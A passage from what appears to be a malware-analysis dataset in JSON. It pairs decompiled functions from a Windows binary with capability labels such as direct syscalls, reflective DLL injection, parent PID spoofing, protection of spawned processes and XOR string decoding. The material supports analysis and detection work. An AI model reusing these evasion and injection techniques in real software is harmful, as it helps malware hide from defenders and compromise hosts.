        "decompiled_code": "\nint64_t * fcn.1400b3b20(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106330, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106370, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106390, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106420, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106440, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106460, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 1743
    },
    "1400b3b8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b3b80(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106330, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106370, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106390, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106420, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106440, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106460, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 1587
    },
    "14000153": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.140001530(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    ulong arg1_00;\n    ulong uStackX16;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_bp_30h;\n    ulong var_38h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    uStackX16 = arg2;\n    var_20h = arg3;\n    var_28h = arg4;\n    arg1_00 = (**0x1400f9540)(1);\n    uVar1 = fcn.14000fb20(arg1_00, arg1, &uStackX16);\n    return uVar1;\n}\n",
        "token_count": 183
    },
    "14000159": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.140001590(int64_t arg1)\n\n{\n    ulong var_10h;\n    uint32_t var_8h;\n    ulong var_4h;\n    \n    var_8h = 0x591b23a4;\n    for (var_4h._0_4_ = 0; *(arg1 + var_4h) != '\\0'; var_4h._0_4_ = var_4h + 1) {\n        var_8h = var_8h ^ *(arg1 + var_4h) + (var_8h >> 8 | var_8h << 0x18);\n    }\n    return var_8h;\n}\n",
        "token_count": 180
    },
    "140001a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute syscall instruction"
        ],
        "decompiled_code": "\nvoid fcn.140001a8d(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.1400019a9(0x31169f3);\n    syscall();\n    return;\n}\n",
        "token_count": 52
    },
    "140001ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute syscall instruction"
        ],
        "decompiled_code": "\nvoid fcn.140001ace(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.1400019a9(0x126006ed);\n    syscall();\n    return;\n}\n",
        "token_count": 49
    },
    "140001b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute syscall instruction"
        ],
        "decompiled_code": "\nvoid fcn.140001b50(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.1400019a9(0x409582ad);\n    syscall();\n    return;\n}\n",
        "token_count": 50
    },
    "140001b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute syscall instruction"
        ],
        "decompiled_code": "\nvoid fcn.140001b91(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.1400019a9(0x47df424e);\n    syscall();\n    return;\n}\n",
        "token_count": 51
    },
    "140001bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute syscall instruction"
        ],
        "decompiled_code": "\nvoid fcn.140001bd2(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.1400019a9(0x781011f);\n    syscall();\n    return;\n}\n",
        "token_count": 50
    },
    "140001c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute syscall instruction"
        ],
        "decompiled_code": "\nvoid fcn.140001c95(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.1400019a9(0x1abd540f);\n    syscall();\n    return;\n}\n",
        "token_count": 51
    },
    "140001cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute syscall instruction"
        ],
        "decompiled_code": "\nvoid fcn.140001cd6(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.1400019a9(0xf8dbfc7a);\n    syscall();\n    return;\n}\n",
        "token_count": 52
    },
    "140001d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute syscall instruction"
        ],
        "decompiled_code": "\nvoid fcn.140001d99(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.1400019a9(0x88824ca9);\n    syscall();\n    return;\n}\n",
        "token_count": 51
    },
    "14000212": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771",
            "spoof parent PID",
            "protect spawned processes with mitigation policies"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar (*) [16] fcn.140002128(uchar (*arg1) [16], ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_30h;\n    uint uVar4;\n    uint uVar5;\n    ulong uStack152;\n    ulong uStack144;\n    ulong var_80h;\n    ulong var_78h;\n    ulong var_70h;\n    uint uStack76;\n    ushort uStack72;\n    ulong var_34h;\n    ulong uStack32;\n    ulong var_8h;\n    \n    puVar3 = &var_80h;\n    for (iVar2 = 0xe; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *arg1 = 0x0;\n    *arg1[1] = 0;\n    var_20h = arg3;\n    (*_sym.imp.KERNEL32.dll_InitializeProcThreadAttributeList)(0, 0, 2, 0, &uStack144);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack32 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1, 0, uStack144);\n    (*_sym.imp.KERNEL32.dll_InitializeProcThreadAttributeList)(uStack32, 2, 0, &uStack144);\n    uStack152 = 0x100000000000;\n    (*_sym.imp.KERNEL32.dll_UpdateProcThreadAttribute)(uStack32, 0, 0x20007, &uStack152, 8, 0, 0);\n    uVar5 = 0;\n    uVar4 = 0;\n    (*_sym.imp.KERNEL32.dll_UpdateProcThreadAttribute)(uStack32, 0, 0x20000, &var_20h, 8, 0, 0);\n    var_80h._0_4_ = 0x70;\n    uStack76 = 0x80001;\n    uStack72 = 0;\n    (*_sym.imp.KERNEL32.dll_CreateProcessA)\n              (0, arg2, 0, 0, CONCAT44(uVar4, 1), CONCAT44(uVar5, 0x808000c), 0, 0, &var_80h, arg1);\n    (*_sym.imp.KERNEL32.dll_DeleteProcThreadAttributeList)(uStack32);\n    return arg1;\n}\n",
        "token_count": 608
    },
    "14000248": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140002485(int64_t arg1)\n\n{\n    uint8_t *puVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    ulong var_20h;\n    uchar auStack168 [16];\n    ulong var_90h;\n    uint8_t auStack136 [16];\n    ulong var_70h;\n    char cStack87;\n    uchar uStack77;\n    int32_t iStack76;\n    uint8_t *puStack72;\n    uchar auStack64 [3];\n    uint8_t *var_35h;\n    uint8_t *var_28h;\n    ulong var_20h_2;\n    ulong var_18h;\n    ulong var_4h;\n    \n    fcn.1400a3990(auStack168);\n    fcn.1400022e4(auStack136, &uStack77);\n    unique0x00003100 = auStack136;\n    if (cStack87 != '\\0') {\n        for (iStack76 = 0; puStack72 = unique0x00003100,  _auStack64 = unique0x00003100,  iStack76 < 0x32;\n            iStack76 = iStack76 + 1) {\n            unique0x00003100[iStack76] = unique0x00003100[iStack76] ^ iStack76 + (iStack76 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    var_28h = unique0x00003100;\n    fcn.1400a4330(auStack168, auStack136);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < *0x1400f93e0; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        var_18h._3_1_ = *(arg1 + var_18h._4_4_);\n        var_20h_2._4_4_ = 0;\n        while( true ) {\n            uVar3 = var_20h_2._4_4_;\n            uVar2 = fcn.140029d80(auStack168);\n            if (uVar2 <= uVar3) break;\n            puVar1 = fcn.1400a43f0(auStack168, var_20h_2._4_4_);\n            var_18h._3_1_ = var_18h._3_1_ ^ *puVar1;\n            var_20h_2._4_4_ = var_20h_2._4_4_ + 1;\n        }\n        *(*0x140129040 + var_18h._4_4_) = var_18h._3_1_;\n    }\n    fcn.1400a1ac0(auStack168);\n    fcn.1400a4220(auStack168);\n    return 0;\n}\n",
        "token_count": 685
    },
    "1400046a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400046a2(void)\n\n{\n    fcn.1400ad0d0(0x140129048);\n    return;\n}\n",
        "token_count": 34
    },
    "14000471": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140004718(void)\n\n{\n    fcn.1400046c0(1, 0xffff);\n    return;\n}\n",
        "token_count": 31
    },
    "1400049e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001400047d7)\n\nuint32_t * fcn.1400049e0(int64_t arg1, uint32_t *arg2)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    cVar1 = **(arg1 + 0x18);\n    if ((cVar1 != 'R') && (cVar1 != 'O')) {\n        return arg2;\n    }\n    uVar5 = 0x20;\n    iVar4 = *(arg1 + 0x48) + 3;\n    if (cVar1 == 'R') {\n        iVar4 = *(arg1 + 0x48) + 2;\n        uVar5 = 0x1f;\n    }\n    *(arg1 + 0x48) = iVar4;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    if (uVar5 < 0x32) {\n        if (0x28 < uVar5) {\n            switch(uVar5) {\n            case 0x29:\n            case 0x2e:\n            case 0x2f:\n                goto code_r0x000140004778;\n            default:\n                return NULL;\n            case 0x30:\n                goto code_r0x00014000476e;\n            }\n        }\n        uVar2 = 1 << uVar5;\n        if ((uVar2 & 0x17c00fff600) == 0) {\n            uVar2 = uVar2 & 0x1fe000000;\n            goto joined_r0x0001400047d3;\n        }\n    }\n    else {\n        if (0x1d < uVar5 - 0x34) {\n            return NULL;\n        }\n        uVar2 = 1 << (uVar5 - 0x34 & 0x3f);\n        if ((uVar2 & 0x1c71107) == 0) {\n            if ((uVar2 & 0xa002ef8) != 0) {\n                return NULL;\n            }\n            uVar2 = uVar2 & 0x34000000;\njoined_r0x0001400047d3:\n            if (uVar2 == 0) {\n                return NULL;\n            }\n            goto code_r0x000140004778;\n        }\n    }\ncode_r0x00014000476e:\n    if (arg2 == NULL) {\n        return NULL;\n    }\ncode_r0x000140004778:\n    iVar4 = *(arg1 + 0x28);\n    if (*(arg1 + 0x2c) <= iVar4) {\n        return NULL;\n    }\n    puVar3 = iVar4 * 0x20 + *(arg1 + 0x20);\n    *(puVar3 + 1) = 0;\n    *(arg1 + 0x28) = iVar4 + 1;\n    *puVar3 = uVar5;\n    *(puVar3 + 4) = arg2;\n    *(puVar3 + 6) = 0;\n    return puVar3;\n}\n",
        "token_count": 715
    },
    "140004c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140004c90(ulong arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    fcn.14000fbd0(arg1, 0x1400ff08c, &uStackX24);\n    return;\n}\n",
        "token_count": 93
    },
    "14000604": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140006040(int64_t arg1)\n\n{\n    ulong uVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    \n    if ((*(arg1 + 0x12) & 4) == 0) {\n        uVar2 = *(arg1 + 0x58);\n        if (0x800 < uVar2) {\n            return 0;\n        }\n        pcVar3 = *(arg1 + 0x18);\n        *(arg1 + 0x58) = uVar2 + 1;\n        uVar1 = 0;\n        if (*pcVar3 != 'F') goto code_r0x00014000606a;\n    }\n    else {\n        pcVar3 = *(arg1 + 0x18);\n        if (*pcVar3 != 'F') {\n            return 0;\n        }\n    }\n    *(arg1 + 0x18) = pcVar3 + 1;\n    if (pcVar3[1] == 'Y') {\n        *(arg1 + 0x18) = pcVar3 + 2;\n    }\n    uVar1 = fcn.140005fc0(arg1, 1);\n    uVar1 = fcn.1400049e0(arg1, uVar1);\n    if (**(arg1 + 0x18) == 'E') {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    if ((*(arg1 + 0x12) & 4) != 0) {\n        return uVar1;\n    }\n    uVar2 = *(arg1 + 0x58) - 1;\ncode_r0x00014000606a:\n    *(arg1 + 0x58) = uVar2;\n    return uVar1;\n}\n",
        "token_count": 416
    },
    "14000be5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000be50(uchar *arg1, ulong noname_1, int64_t arg3, int64_t *arg4)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    uint8_t uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    \n    piVar1 = arg4;\n    if (arg4 != NULL) {\n        do {\n            if (*(piVar1 + 2) != 0) break;\n            if (*piVar1[1] < 0x2c) {\n                uVar4 = 1 << (*piVar1[1] & 0x3f);\n                if ((uVar4 & 0x8620e000000) == 0) {\n                    if ((uVar4 & 0x1c00000000) == 0) goto code_r0x00014000bead;\n                    uVar3 = arg1[0x108];\n                    if ((uVar3 & 0xfd) != 0x28) goto code_r0x00014000bf77;\n                    iVar6 = *(arg1 + 0x100);\n                    if (iVar6 != 0xff) goto code_r0x00014000bf93;\ncode_r0x00014000c07f:\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar5 = 1;\n                    iVar6 = 0;\n                }\n                else {\n                    uVar3 = arg1[0x108];\ncode_r0x00014000bf77:\n                    iVar5 = *(arg1 + 0x100);\n                    iVar6 = iVar5;\n                    if (uVar3 == 0x20) {\ncode_r0x00014000bf87:\n                        if (iVar6 == 0xff) goto code_r0x00014000c07f;\n                    }\n                    else {\n                        if (iVar5 != 0xff) {\n                            iVar6 = iVar5 + 1;\n                            *(arg1 + 0x100) = iVar6;\n                            arg1[iVar5] = 0x20;\n                            arg1[0x108] = 0x20;\n                            goto code_r0x00014000bf87;\n                        }\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *arg1 = 0x20;\n                        iVar6 = 1;\n                        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    }\ncode_r0x00014000bf93:\n                    iVar5 = iVar6 + 1;\n                }\n                *(arg1 + 0x100) = iVar5;\n                arg1[iVar6] = 0x28;\n                uVar7 = *(arg1 + 0x128);\n                arg1[0x108] = 0x28;\n                *(arg1 + 0x128) = 0;\n                fcn.14000c170(arg1, 0x11, arg4, 0);\n                iVar6 = *(arg1 + 0x100);\n                if (iVar6 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *arg1 = 0x29;\n                    iVar5 = 1;\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    goto code_r0x00014000bef1;\n                }\n                iVar5 = iVar6 + 1;\n                *(arg1 + 0x100) = iVar5;\n                arg1[iVar6] = 0x29;\n                arg1[0x108] = 0x29;\n                goto joined_r0x00014000bffe;\n            }\ncode_r0x00014000bead:\n            piVar1 = *piVar1;\n        } while (piVar1 != NULL);\n    }\n    uVar7 = *(arg1 + 0x128);\n    *(arg1 + 0x128) = 0;\n    fcn.14000c170(arg1, 0x11, arg4, 0);\n    iVar5 = *(arg1 + 0x100);\njoined_r0x00014000bffe:\n    if (iVar5 == 0xff) {\n        arg1[0xff] = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *arg1 = 0x28;\n        arg1[0x108] = 0x28;\n        iVar6 = *(arg3 + 0x18);\n        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n        *(arg1 + 0x100) = 1;\n        if (iVar6 != 0) goto code_r0x00014000bf10;\n        iVar2 = 1;\n    }\n    else {\ncode_r0x00014000bef1:\n        iVar2 = iVar5 + 1;\n        *(arg1 + 0x100) = iVar2;\n        arg1[iVar5] = 0x28;\n        arg1[0x108] = 0x28;\n        iVar6 = *(arg3 + 0x18);\n        if (iVar6 != 0) {\ncode_r0x00014000bf10:\n            fcn.14000b4c0(arg1, 0x11, iVar6);\n            iVar2 = *(arg1 + 0x100);\n        }\n        if (iVar2 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar6 = 1;\n            iVar2 = 0;\n            goto code_r0x00014000bf34;\n        }\n    }\n    iVar6 = iVar2 + 1;\ncode_r0x00014000bf34:\n    *(arg1 + 0x100) = iVar6;\n    arg1[iVar2] = 0x29;\n    arg1[0x108] = 0x29;\n    fcn.14000c170(arg1, 0x11, arg4, 1);\n    *(arg1 + 0x128) = uVar7;\n    return;\n}\n",
        "token_count": 1516
    },
    "14000c4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000c4f0(ushort *arg1, ulong noname_1, int64_t arg3, int64_t *arg4)\n\n{\n    uchar uVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar *puVar5;\n    \n    piVar2 = arg4;\n    if (arg4 != NULL) {\ncode_r0x00014000c524:\n        if (*(piVar2 + 2) != 0) goto code_r0x00014000c518;\n        if (*piVar2[1] != 0x2a) {\n            puVar5 = 0x1400ff9fc;\n            iVar4 = *(arg1 + 0x80);\n            do {\n                uVar1 = *puVar5;\n                if (iVar4 == 0xff) {\n                    *(arg1 + 0xff) = 0;\n                    (**(arg1 + 0x88))(arg1, 0xff, *(arg1 + 0x8c));\n                    *(arg1 + 0xa0) = *(arg1 + 0xa0) + 1;\n                    iVar3 = 1;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar3 = iVar4 + 1;\n                }\n                puVar5 = puVar5 + 1;\n                *(arg1 + 0x80) = iVar3;\n                *(arg1 + iVar4) = uVar1;\n                *(arg1 + 0x84) = uVar1;\n                iVar4 = iVar3;\n            } while (puVar5 != 0x1400ff9fe);\n            fcn.14000c170(arg1, 0x11, arg4, 0);\n            iVar4 = *(arg1 + 0x80);\n            if (iVar4 != 0xff) {\n                iVar3 = iVar4 + 1;\n                *(arg1 + 0x80) = iVar3;\n                *(arg1 + iVar4) = 0x29;\n                *(arg1 + 0x84) = 0x29;\n                goto joined_r0x00014000c747;\n            }\n            *(arg1 + 0xff) = 0;\n            (**(arg1 + 0x88))(arg1, 0xff, *(arg1 + 0x8c));\n            iVar4 = 2;\n            *(arg1 + 0xa0) = *(arg1 + 0xa0) + 1;\n            *arg1 = 0x2029;\n            goto code_r0x00014000c55f;\n        }\n        fcn.14000c170(arg1, 0x11, arg4, 0);\n        iVar4 = *(arg1 + 0x80);\n        